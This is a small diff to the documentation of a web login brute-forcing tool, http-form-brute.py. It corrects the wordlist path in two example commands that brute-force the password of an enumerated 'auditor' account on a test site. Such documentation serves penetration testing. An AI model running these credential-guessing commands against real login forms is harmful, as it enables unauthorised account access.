@@ -196,13 +196,13 @@ Carrying out the attack via the first means carries out a search for any respons
 Carrying out the user brute method, it should be apparent that the valid username is *'auditor'*; this can then be used to brute force the password:
 
 ```
-~$ http-form-brute.py -pU user -pP pass -l auditor -p /usr/share/wordlists -sX "Login failed." -t 3
+~$ http-form-brute.py -pU user -pP pass -l auditor -p /usr/share/wordlists/fasttrack.txt -sX "Login failed." -t 3
 ```
 
 This, in the case of the test site, is equivalent to:
 
 ```
-~$ http-form-brute.py -pU user -pP pass -l auditor -p /usr/share/wordlists -sM "Login successful" -t 3
+~$ http-form-brute.py -pU user -pP pass -l auditor -p /usr/share/wordlists/fasttrack.txt -sM "Login successful" -t 3
 ```
 
 # I want Moar
